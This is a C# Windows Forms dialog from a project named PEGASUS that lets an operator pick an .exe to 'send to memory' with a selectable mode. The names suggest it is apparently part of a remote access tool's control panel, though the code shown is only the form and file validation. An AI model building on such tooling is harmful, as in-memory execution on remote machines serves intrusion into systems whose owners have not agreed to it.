using System;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using PEGASUS.IcarusWings;

namespace PEGASUS
{
    public partial class FormSendFileToMemory : Form
    {
        public bool IsOK;

        public FormSendFileToMemory()
        {
            InitializeComponent();
        }

        private void SendFileToMemory_Load(object sender, EventArgs e)
        {
            comboBox1.SelectedIndex = 0;
            comboBox2.SelectedIndex = 0;
        }

        private void comboBox1_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboBox1.SelectedIndex)
            {
                case 0:
                    label3.Visible = false;
                    comboBox2.Visible = false;
                    break;
                case 1:
                    label3.Visible = true;
                    comboBox2.Visible = true;
                    break;
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var O = new OpenFileDialog())
            {
                O.Filter = "(*.exe)|*.exe";
                if (O.ShowDialog() == DialogResult.OK)
                {
                    toolStripStatusLabel1.Text = Path.GetFileName(O.FileName);
                    toolStripStatusLabel1.Tag = O.FileName;
                    toolStripStatusLabel1.ForeColor = Color.FromArgb(3, 130, 200);
                    IsOK = true;
                    if (comboBox1.SelectedIndex == 0)
                        try
                        {
                            new ReferenceLoader().AppDomainSetup(O.FileName);
                            IsOK = true;
                        }
                        catch
                        {
                            toolStripStatusLabel1.ForeColor = Color.Red;
                            toolStripStatusLabel1.Text += " Invalid!";
                            IsOK = false;
                        }

                    textBox1.Text = Path.GetFileName(O.FileName);
                }
                else
                {
                    toolStripStatusLabel1.Text = "";
                    toolStripStatusLabel1.ForeColor = Color.FromArgb(3, 130, 200);
                    IsOK = true;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (IsOK)
                Hide();
        }

        private void Button3_Click(object sender, EventArgs e)
        {
            IsOK = false;
            Hide();
        }

        private void guna2PictureBox1_Click(object sender, EventArgs e)
        {
            Close();
        }

        [DllImport("user32.DLL", EntryPoint = "ReleaseCapture")]
        private static extern void ReleaseCapture();

        [DllImport("user32.DLL", EntryPoint = "SendMessage")]
        private static extern void SendMessage(IntPtr hwnd, int wmsg, int wparam, int lparam);

        private void guna2Panel1_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, 0x112, 0xf012, 0);
        }
    }
}